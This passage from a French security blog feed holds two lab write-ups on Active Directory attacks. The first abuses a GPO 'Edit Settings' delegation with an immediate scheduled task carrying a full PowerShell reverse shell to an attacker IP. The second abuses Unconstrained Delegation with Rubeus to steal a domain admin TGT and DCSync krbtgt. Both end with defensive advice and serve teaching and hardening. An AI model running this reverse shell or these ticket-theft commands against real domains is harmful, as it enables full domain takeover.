&lt;p&gt;Par défaut, lorsqu’une GPO est créée, peu de personnes ont le droit de la modifier. Les utilisateurs peuvent la lire (obligatoire pour pouvoir l’appliquer !), mais seuls les groupes “Domain Admins” et “Enterprise Admins” ont les droits absolus dessus, c’est à dire qu’ils peuvent la modifier (Edit Settings), la supprimer (Delete), et modifier les droits d’accès (Modify Security).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/ACL_GPO.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/ACL_GPO.png&quot; alt=&quot;ACL GPO&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Si un administrateur souhaite déléguer ces permissions à un utilisateur sans pour autant l’ajouter à l’un des deux groupes, c’est tout à fait possible via cet onglet de délégation. C’est un endroit simplifiant la gestion des droits sur une GPO. En effet, il est tout à fait possible de modifier les droits directement au niveau de la GPC, mais c’est beaucoup plus complexe.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/GPC_rights.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/GPC_rights.png&quot; alt=&quot;GPC Rights&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;On voit que la barre de défilement permet de lister un grand, très grand nombre de paramètres d’accès.&lt;/p&gt;

&lt;p&gt;Il est donc plus aisé de passer par l’interface de gestion des GPO pour ajouter un utilisateur afin de lui déléguer des droits :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/add_user_acl_gpo.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/add_user_acl_gpo.png&quot; alt=&quot;Add User ACL Gpo&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Puis on indique les droits qu’on lui concède :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/edit_settings_add_user.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/edit_settings_add_user.png&quot; alt=&quot;Edit settings user&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Trois choix sont proposés, choix qui sont une préselection facilitant la vie des administrateurs, en modifiant des droits bien précis au niveau de la GPC.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/settings_added.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/settings_added.png&quot; alt=&quot;Edit settings added for user&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Maintenant cet utilisateur fait partie des personnes/groupes à avoir les droits ultimes sur cette GPO. C’est ce contrôle total que l’on voit apparaitre dans BloodHound lorsqu’une entité a un lien “WriteDacl” vers une GPO. En effet, cette présélection ajoute les paramètres de sécurité “Modify Owner” et “Modify Permissions”.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/writedacl.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/writedacl.png&quot; alt=&quot;Write DACL&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;droit-edit-settings&quot;&gt;Droit “Edit Settings”&lt;/h2&gt;

&lt;p&gt;On a vu au-dessus qu’il y avait trois niveaux de délégation :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Read&lt;/li&gt;
  &lt;li&gt;Edit Settings&lt;/li&gt;
  &lt;li&gt;Edit Settings, delete, modify security&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Il n’y a que le troisième niveau qui est pris en charge dans la collecte BloodHound. Cependant, que se passe-t-il si un utilisateur ne possède que le droit de modifier la GPO, mais pas les ACL associées ? BloodHound ne remontant pas ce lien, c’est la question que je me suis posée.&lt;/p&gt;

&lt;p&gt;Pour y répondre, j’ai créé une GPO d’exemple, appelée “TestGPO Abuse”, s’appliquant à l’ensemble des utilisateurs appartenant à l’OU “Domain Users”. Comme dans l’exemple précédant, j’ai ajouté l’utilisateur “jdoe” dans la délégation de la gestion de cette GPO, en indiquant qu’il ne pouvait que modifier les paramètres de cette GPO, mais pas les ACL associées (“Edit Settings”).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/edit_settings_jdoe.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/edit_settings_jdoe.png&quot; alt=&quot;Edit Settings for jdoe&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;gpo-appliquée-à-des-utilisateurs&quot;&gt;GPO appliquée à des utilisateurs&lt;/h2&gt;

&lt;p&gt;Dans ma recherche, je souhaitais également savoir ce que je pouvais faire lorsque la GPO ne s’appliquait qu’à des utilisateurs, pas à des machines. C’est pourquoi “TestGPO Abuse” ne s’applique qu’à l’OU “Domain Users”. En effet, tous les paramètres contrôlables dans la partie “Computer Configuration” de la GPO ne s’appliqueront pas si cette GPO est destinée à des utilisateurs. Seuls ceux dans “User Configuration” le seront.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/no_computer_gpo.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/no_computer_gpo.png&quot; alt=&quot;No Computer GPO&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Mais concrètement, qu’est-ce qui est disponible dans les paramètres de GPO appliqués à un utilisateur ? Et bien beaucoup moins de choses, mais des paramètres intéressants tout de même !&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/user_gpo_example.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/user_gpo_example.png&quot; alt=&quot;User Example GPO&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;On voit qu’on peut installer des paquets, gérer encore une fois les scripts au login/logout, éditer des groupes et utilisateurs locaux et les tâches planifiées.&lt;/p&gt;

&lt;h2 id=&quot;exploitation-via-une-tâche-planifiée-immédiate&quot;&gt;Exploitation via une tâche planifiée immédiate&lt;/h2&gt;

&lt;p&gt;Nous allons nous intéresser plus particulièrement aux tâches planifiées. Il est possible de créer des tâches planifiées qui s’exécuteront immédiatement, lorsque la GPO sera appliquée à l’utilisateur.&lt;/p&gt;

&lt;p&gt;Ainsi, si nous nous connectons en tant que l’utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;jdoe&lt;/code&gt; sur une machine, nous pouvons créer cette tâche.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/abusetask.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/abusetask.png&quot; alt=&quot;Abuse Task&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Elle est créée en tant que l’utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;jdoe&lt;/code&gt;, et lorsqu’elle sera appliquée, ce sera en tant que l’utilisateur à qui elle s’applique.&lt;/p&gt;

&lt;p&gt;Dans l’onglet “Actions”, nous indiquons ce qu’il se passera à l’exécution. Ici, nous utilisons un reverse-shell en Powershell pour que lors de son exécution, l’utilisateur cible se connecte à l’attaquant en proposant un shell.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.Sockets.TCPClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.0.20.12&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65535&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-ne&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TypeName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Text.ASCIIEncoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Out-String&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;PS &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbyte&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;text.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ASCII&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendback2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sendbyte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()};&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ce code est transormé en base 64 pour le passer à la commande &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell -enc &amp;lt;base 64 de la commande&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/abusetask_pwsh.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/abusetask_pwsh.png&quot; alt=&quot;Abuse Task Powershell&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Une fois cette tâche créée, lors de la mise à jour des GPO sur un client, par exemple sur le compte &lt;code class=&quot;highlighter-rouge&quot;&gt;support-account&lt;/code&gt; qui est administrateur du domaine dans ce lab, elle est exécutée sur la machine, et l’attaquant récupère un shell en tant qu’administrateur du domaine.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/re_shell_worked.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/re_shell_worked.png&quot; alt=&quot;Reverse Shell Worked&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;L’idée de cet article est de montrer que les GPO sont un pilier dans l’organisation d’un Active Directory, et doivent être maitrisées tout autant que beaucoup d’autres objets. Une permission mal placée peut permettre à un attaquant d’en abuser et d’élever ses privilèges dans le système d’information.&lt;/p&gt;

&lt;p&gt;Ici, l’exemple de la tâche planifiée a été utilisé sur une GPO appliquée à des utilisateurs, cependant il existe un grand nombre de possibilités ouvertes par les GPO qui peuvent être utilisées pour exécuter du code.&lt;/p&gt;
</description>
        <pubDate>Tue, 23 Apr 2019 13:28:42 +0200</pubDate>
        <link>http://localhost:4000//gpo-abuse-with-edit-settings/</link>
        <guid isPermaLink="true">http://localhost:4000//gpo-abuse-with-edit-settings/</guid>
        
        <category>Active Directory</category>
        
        <category>Windows</category>
        
        
      </item>
    
      <item>
        <title>Unconstrained Delegation - Risques</title>
        <description>&lt;p&gt;Suite à l’article sur la &lt;a href=&quot;/constrained-unconstrained-delegation&quot;&gt;délégation Kerberos&lt;/a&gt;, nous allons maintenant voir comment abuser de la délégation complète (Unconstrained Delegation) afin de récupérer le TGT d’un utilisateur, nous permettant ainsi de nous authentifier auprès de n’importe quel service en son nom.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;rappels--unconstrained-delegation&quot;&gt;Rappels : Unconstrained Delegation&lt;/h2&gt;

&lt;p&gt;Comme nous l’avons vu dans l’article sur la &lt;a href=&quot;/constrained-unconstrained-delegation&quot;&gt;délégation Kerberos&lt;/a&gt;, lorsqu’un compte possède le drapeau “Unconstrained Delegation” (&lt;code class=&quot;highlighter-rouge&quot;&gt;ADS_UF_TRUSTED_FOR_DELEGATION&lt;/code&gt;), si les informations d’authentification de l’utilisateur faisant une demande de TGS pour un service proposé par ce compte peuvent être relayées, alors le contrôleur de domaine va répondre à l’utilisateur avec un &lt;a href=&quot;/kerberos/#krb_tgs_req&quot;&gt;KRB_TGS_REQ&lt;/a&gt; contenant les informations classiques telles que le TGS, mais il va également intégrer dans sa réponse &lt;strong&gt;une copie du TGT&lt;/strong&gt; de l’utilisateur, ainsi qu’une nouvelle clé de session associée.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/cop_tgt.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/cop_tgt.png&quot; alt=&quot;Unconstrained Delegation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Concrètement, le compte de service qui recevra ce TGS &lt;strong&gt;aura aussi une copie du TGT de l’utilisateur&lt;/strong&gt;, ainsi qu’une clé de session valide pour utiliser ce TGT.&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;Cela signifie que maintenant, avec ces informations, le service peut demander n’importe quel TGS au nom de l’utilisateur. Je répète : il peut demander &lt;strong&gt;n’importe. quel. TGS. au nom de l’utilisateur&lt;/strong&gt;. Il peut se faire passer pour l’utilisateur pour s’authentifier auprès de n’importe quel service.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/unconstrained_delegation_schema.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/unconstrained_delegation_schema.png&quot; alt=&quot;Unconstrained Delegation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Du coup, si l’utilisateur en question possède des droits d’administration pour certaines tâches, le service qui possède maintenant une copie du TGT de cet utilisateur possède également des droits d’administration pour ces tâches. Par exemple, sur ce schéma, un utilisateur est administrateur local d’un contrôleur de domaine. Cet utilisateur se connecte au serveur compromis qui est en “Unconstrained Delegation”.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/unconstrained_admin.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/unconstrained_admin.png&quot; alt=&quot;Unconstrained Delegation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Et bien l’attaquant possède maintenant une copie du TGT de cet utilisateur, et peut se faire passer pour lui auprès du contrôleur de domaine, donc être administrateur local de celui-ci.&lt;/p&gt;

&lt;p&gt;Ainsi, les comptes ayant la délégation complète sont des cibles prioritaires pour les attaquants, puisqu’une fois un de ces comptes compromis, il suffit d’attendre des authentifications d’utilisateurs pour pouvoir s’authentifier n’importe où en leur nom. Si un administrateur de domaine s’authentifie auprès d’un service proposé par ce compte, alors l’attaquant a gagné, le domaine est totalement compromis.&lt;/p&gt;

&lt;h2 id=&quot;par-lexemple&quot;&gt;Par l’exemple&lt;/h2&gt;

&lt;p&gt;Nous allons ici présenter un exemple qui a été effectué dans mon lab, ADSEC. Il y a ici la machine &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-01&lt;/code&gt; qui est en “Unconstrained Delegation”.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/server_01_unconstrained.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/server_01_unconstrained.png&quot; alt=&quot;Unconstrained Delegation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Il est possible de s’authentifier auprès de cette machine pour utiliser ses partages réseau. Nous imaginons qu’un attaquant ait réussi à compromettre cette machine, et qu’il est administrateur local de cette machine.&lt;/p&gt;

&lt;p&gt;L’attaquant doit alors attendre qu’un utilisateur à privilèges se connecte sur la machine. Il va donc monitorer les connexions et inspecter les TGS afin de voir si un TGT est présent dans l’un deux. Pour cela, il utilise l’outil &lt;a href=&quot;https://github.com/GhostPack/Rubeus&quot;&gt;Rubeus&lt;/a&gt; développé par &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;@Harmj0y&lt;/a&gt;. (D’autres outils existent tels que &lt;a href=&quot;https://github.com/gentilkiwi/kekeo/&quot;&gt;kekeo&lt;/a&gt; de &lt;a href=&quot;https://twitter.com/gentilkiwi&quot;&gt;@gentilkiwi&lt;/a&gt; par exemple.)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.\Rubeus monitor /interval:5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/wait_for_connexion.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/wait_for_connexion.png&quot; alt=&quot;Rubeus Monitor&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Il se trouve qu’à un moment donné, le compte &lt;code class=&quot;highlighter-rouge&quot;&gt;support-account&lt;/code&gt;, &lt;strong&gt;administrateur de domaine&lt;/strong&gt;, doit aller voir quelque chose sur le disque dur de &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-01&lt;/code&gt;. Pour cela, il se connecte au partage réseau du serveur &lt;code class=&quot;highlighter-rouge&quot;&gt;\\WEB-SERVER-01\c$&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/connexion_from_domain_admin.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/connexion_from_domain_admin.png&quot; alt=&quot;Connexion from DA&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Cette connexion est détectée par Rubeus, puisqu’un événement &lt;a href=&quot;https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4624&quot;&gt;4624&lt;/a&gt; (Successful logon) est généré dans le journal d’événements de &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-01&lt;/code&gt;. Comme cette machine est en “Unconstrained Delegation”, le TGS envoyé par l’administrateur de domaine contient une copie de son TGT, copie qui va être extrait par Rubeus.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/connexion_success.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/connexion_success.png&quot; alt=&quot;Connexion success on Rubeus&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Maintenant en possession du TGT d’un administrateur de domaine (encodé en base 64 dans cette capture), l’attaquant peut demander un TGS pour utiliser le service LDAP du contrôleur de domaine &lt;code class=&quot;highlighter-rouge&quot;&gt;DC-01&lt;/code&gt;. Rubeus permet de faire cette requête.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.\Rubeus.exe asktgs /ticket:&amp;lt;ticket en base64&amp;gt; /service:ldap/dc-01.adsec.local /ptt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/get_ldap_tgs.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/get_ldap_tgs.png&quot; alt=&quot;Get LDAP TGS&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Tout fonctionne comme prévu, nous pouvons vérifier la présence du TGS en mémoire, pour l’utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;support-account&lt;/code&gt; (puisque l’attaquant a utilisé son TGT), et pour le service LDAP du contrôleur de domaine.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/get_ldap_tgs_success.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/get_ldap_tgs_success.png&quot; alt=&quot;Get LDAP TGS&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Avec ce TGS, il est possible de demander au contrôleur de domaine de se synchroniser avec l’attaquant. Ici, l’attaquant a uniquement demandé de synchroniser le compte &lt;code class=&quot;highlighter-rouge&quot;&gt;krbtgt&lt;/code&gt; en vue de faire un “Golden Ticket”.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/dc_sync.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/dc_sync.png&quot; alt=&quot;DCSync&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Avec le hash NT du compte &lt;code class=&quot;highlighter-rouge&quot;&gt;krbtgt&lt;/code&gt;, l’attaquant peut tout faire sur l’Active Directory.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Cette démonstration montre l’impact immense que peut avoir la compromission d’une machine en “Unconstrained Delegation”. C’est pourquoi ces machines doivent être surveillées, mais devraient surtout être en &lt;a href=&quot;/constrained-unconstrained-delegation/#kerberos-constrained-delegation---kcd&quot;&gt;Constrained Delegation&lt;/a&gt; afin de maitriser les services auxquels elles peuvent se connecter lors de la délégation d’authentification. Par ailleurs, les comptes sensibles devraient avoir l’option “Account is sensitive and cannot be delegated” d’activée, ce qui n’était pas le cas dans l’exemple précédent.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/account_sensitive.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/account_sensitive.png&quot; alt=&quot;DCSync&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

